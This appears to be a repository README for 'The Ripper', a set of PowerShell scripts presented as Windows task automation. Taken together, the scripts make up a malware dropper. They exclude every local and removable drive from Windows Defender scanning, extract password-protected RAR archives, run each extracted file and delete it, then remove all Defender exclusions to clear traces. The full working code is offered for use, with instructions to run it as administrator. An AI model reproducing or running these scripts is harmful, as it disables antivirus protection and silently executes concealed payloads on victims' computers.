# The Ripper 🔪

A collection of PowerShell scripts to automate various tasks on Windows systems, such as enabling administrator rights, adding Windows Defender exclusions, and extracting/handling files.

## Included Scripts 📜

### 1. `enable_the_administrator.ps1` 👑

This script checks if the current user has administrative rights. If not, it displays an error message and stops execution. If the user is an administrator, a confirmation message is shown.

```powershell
Try {
    # Check if the user has administrative rights
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    If (-Not $isAdmin) {
        Write-Host "This script must be run as an administrator." -ForegroundColor Red
        Exit 1
    }
    else {
        Write-Host "Administrator rights: Enabled" -ForegroundColor Green
    }

} Catch {
    Write-Host "An error occurred: $_" -ForegroundColor Red
}
```

- **Explanation**: This script uses .NET framework objects to check if the user is an administrator. If the user is not an administrator, the script execution is stopped with an error message.

### 2. `exclusion_for_all.ps1` 🔒

This script adds exclusions for all connected drives (internal, external, removable) to Windows Defender. It ignores network drives and drives without a letter.

```powershell
# Function to add exclusions for all connected drives
Function Add-ExclusionForAllDrives {
    $allDrives = Get-WmiObject -Class Win32_LogicalDisk
    foreach ($drive in $allDrives) {
        # Ignore network drives and drives without a letter
        if ($drive.DriveType -ne 4 -and $drive.DeviceID) {
            $driveLetter = $drive.DeviceID + '\'
            Write-Host "Adding exclusion for drive: $driveLetter" -ForegroundColor Yellow
            Add-MpPreference -ExclusionPath $driveLetter
        }
    }
}

Add-ExclusionForAllDrives
```

- **Explanation**: This script uses `Get-WmiObject` to retrieve all drives and exclude them from Windows Defender. It only considers local and removable drives, ignoring network drives.

### 3. `start_Payload_for_rar.ps1` 🎯

This script extracts all `.rar` files from the project's root directory to a specific folder, then executes each extracted file and deletes it after execution.

```powershell
$projectRoot = $PSScriptRoot
$extractPath = "$projectRoot\extraction"

if (-not (Test-Path $extractPath)) {
    New-Item -ItemType Directory -Force -Path $extractPath
}

$rarFiles = Get-ChildItem -Path $projectRoot -Filter "*.rar"
foreach ($rarFile in $rarFiles) {
    Write-Host "Extracting archive: $rarFile" -ForegroundColor Yellow
    & "C:\\Program Files\\WinRAR\\WinRAR.exe" x -p"toto123" -o+ "$rarFile" "$extractPath"
    Start-Sleep -Seconds 4

    $extractedFiles = Get-ChildItem -Path $extractPath
    foreach ($file in $extractedFiles) {
        Write-Host "Executing: $file" -ForegroundColor Green
        if ($file.PSIsContainer) { 
            Write-Host "The file $file is a directory and will be ignored." -ForegroundColor Yellow
            continue
        }

        try {
            $process = Start-Process -FilePath $file.FullName -PassThru
            $process.WaitForExit()
            Write-Host "The file $file has finished executing." -ForegroundColor Green
        }
        catch {
            Write-Host "Error running the file." -ForegroundColor Red
        }

        Remove-Item -Path $file.FullName -Force
        Write-Host "The file $file has been deleted." -ForegroundColor Green
    }
}

Write-Host "Processing complete." -ForegroundColor Green
```

- **Explanation**: This script extracts all `.rar` files into the specified folder, executes them, and deletes them afterward. It uses WinRAR for extraction and waits for the process to finish before moving on to the next file.

### 4. `disable_exclusion_and_payload.ps1` 🛑

This script removes all Windows Defender exclusions and also deletes the extraction folder of files.

```powershell
$projectRoot = $PSScriptRoot
$extractPath = "$projectRoot\extraction"

Function Remove-ExtractionFolder {
    if (Test-Path $extractPath) {
        Remove-Item -Path $extractPath -Recurse -Force
        Write-Host "The extraction folder has been deleted." -ForegroundColor Green
    } else {
        Write-Host "The extraction folder does not exist." -ForegroundColor Yellow
    }
}

Function Disable-WindowsDefenderExclusions {
    $defenderExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    if ($defenderExclusions) {
        foreach ($exclusion in $defenderExclusions) {
            Remove-MpPreference -ExclusionPath $exclusion
            Write-Host "Exclusion removed: $exclusion" -ForegroundColor Yellow
        }
    } else {
        Write-Host "No exclusions found in Windows Defender." -ForegroundColor Yellow
    }
}

Disable-WindowsDefenderExclusions
Remove-ExtractionFolder

Write-Host "Process complete." -ForegroundColor Green
```

- **Explanation**: This script disables all Windows Defender exclusions and removes the extraction folder, cleaning up unnecessary files.


## How to Use the Scripts 🔧

1. **Download or clone this repository**.
2. **Run each script with administrator privileges** for everything to work properly.
3. **Follow the on-screen messages** to track the actions being performed (adding exclusions, extracting files, executing files, etc.).

## Warning ⚠️

These scripts can interact with important system settings such as Windows Defender exclusions. Use them with caution and make sure you understand how they work before executing them.
